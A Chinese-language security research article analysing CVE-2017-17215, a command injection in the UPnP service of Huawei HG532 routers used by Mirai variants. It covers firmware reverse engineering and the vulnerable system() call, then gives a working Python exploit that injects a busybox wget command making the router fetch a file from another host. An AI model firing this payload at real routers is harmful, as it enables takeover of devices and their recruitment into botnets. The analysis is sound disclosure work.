作者：fenix@知道创宇404实验室  
English version: <https://paper.seebug.org/508/>

#### 背景

华为 HG532 系列路由器是一款为家庭和小型办公用户打造的高速无线路由器产品。

2017/11/27，Check Point 软件技术部门报告了一个华为 HG532
产品的远程命令执行漏洞(CVE-2017-17215)[【1】](https://research.checkpoint.com/good-zero-day-skiddie/ "【1】") 。

该漏洞在被报告前，互联网上产生了大量未被关注的此类漏洞攻击利用包，遍及全球多个国家。Payload 已被证实是知名病毒 Mirai 的升级版变种
OKIRU/SATORI。该 Payload 功能非常简单，主要通过发送精心制作的 UDP/TCP 报文来对目标发起 DDoS 攻击。

2017/11/23，知道创宇 404 实验室的 ZoomEye 网络探针系统也捕获到了该攻击的 Payload。

![](https://images.seebug.org/content/images/2017/12/9e0a4748-3048-4235-aee1-7cd6981dd413.png-w331s)

#### 漏洞分析

##### 固件下载

网上有 HG532e
版本的公开固件，下载地址[【2】](https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar
"【2】")

下载该固件，利用 binwalk 直接解压。

![](https://images.seebug.org/content/images/2017/12/f95ee0b7-836d-4401-b6fd-6b7a51326bad.png-w331s)

目标系统是 MIPS 32 位 大端架构。

##### 漏洞分析

根据 Check Point 的报告[【1】](https://research.checkpoint.com/good-zero-day-skiddie/
"【1】")，该远程命令执行漏洞的漏洞点位于 UPnP 服务中。

UPnP 是由“通用即插即用论坛”（UPnP™
Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。

直接将固件中负责 UPnP 服务的 upnp 程序扔到 IDA。

通过字符串 `NewStatusURL` 对漏洞点进行定位。

![](https://images.seebug.org/content/images/2017/12/7f80c319-c6d9-4e3b-ac98-4eb802788e9d.jpeg-w331s)

跟踪数据交叉引用
![](https://images.seebug.org/content/images/2017/12/f6bef7a5-9d87-4e72-bd16-7e8ece526aa2.png-w331s)

漏洞点如下
![](https://images.seebug.org/content/images/2017/12/77741127-98d5-4f45-baaa-0968cdd77034.png-w331s)

ATP_XML_GetChildNodeByName 函数的定义如下。
![](https://images.seebug.org/content/images/2017/12/5587ac66-270d-41ec-913d-39ea58521861.png-w331s)

![](https://images.seebug.org/content/images/2017/12/61639ab2-8613-4fdd-bef0-4951f1362bf3.png-w331s)

程序首先进行 SOAP XML 报文解析，得到元素 NewDownloadURL 和 NewStatusURL 的值。然后进行以下拼接，最终调用
system() 函数执行。

    
    
    snprintf($s0, 0x400, 'upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -', NewDownloadURL, NewStatusURL)
    
    system($s0)

`upg` 是路由器的一个升级程序，他的参数功能如下。

![](https://images.seebug.org/content/images/2017/12/ac6675db-5787-45b9-ae37-9a6cccaf48f4.jpeg-w331s)

现在我们有两个命令注入点，`NewDownloadURL` 和 `NewStatusURL`。

##### 漏洞验证

目标系统提供了以下命令。

![](https://images.seebug.org/content/images/2017/12/ebc5ec4d-0b69-4687-b4b9-279ea8188bcc.png-w331s)

利用 wget 命令进行漏洞测试。发送以下报文。

    
    
    import requests
    
    headers = {
        "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
    }
    
    data = '''<?xml version="1.0" ?>
     <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
       <NewStatusURL>;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;</NewStatusURL>
       <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
      </u:Upgrade>
     </s:Body>
    </s:Envelope>
    '''
    requests.post('http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)

可以看到，我们成功在监听的端口上收到了请求。
![](https://images.seebug.org/content/images/2017/12/6ea4158f-8fef-49db-bb97-3849e1d1b2ec.png-w331s)

值得一提的是，HG532e 路由器的 uPnP 服务和防火墙都是默认开启的，防火墙默认等级为低级。

![](https://images.seebug.org/content/images/2017/12/8396e60c-eea7-48c1-b709-979482806fc9.png-w331s)

在默认设置下，从 WAN 口访问 37215 端口会被防火墙拦截，漏洞无法被利用。

![](https://images.seebug.org/content/images/2017/12/7edd5e24-33fc-481a-8d88-e2e56b16d384.png-w331s)

##### 防护方案

2017/11/30，华为官方发布了安全公告[【4】](http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en "【4】")，确认了该漏洞。 公告中提到了以下漏洞缓解措施

  * 配置路由器内置的防火墙
  * 更改路由器默认密码
  * 在路由器外部署防火墙

是的，没找到固件升级包，所以，没有补丁分析...

#### 总结

  1. 和爱尔兰宽带路由器 SetNTPServers 命令注入[【3】](https://www.seebug.org/vuldb/ssvid-97024 "【3】")类似，这个漏洞整体来看就是一个简单的命令拼接。
  2. 该漏洞也为我们漏洞挖掘提供了一个很好的方向。snprintf()、system() 等函数附近的程序逻辑都应该被重点关注。
  3. 还是那句话，一切进入函数的变量都是有害的。大部分远程命令执行漏洞要么是过滤不全，导致命令拼接。要么是没有进行变量长度控制，造成缓冲区溢出。关于这点设备供应商应该负责任，安全开发意识非常重要。

#### 参考链接

【1】 Check Point 漏洞报告  
<https://research.checkpoint.com/good-zero-day-skiddie/>  
【2】 HG532e 固件下载  
<https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar>  
【3】 爱尔兰宽带路由器 SetNTPServers 命令注入  
<https://www.seebug.org/vuldb/ssvid-97024>  
【4】 华为安全公告  
<http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/490/>

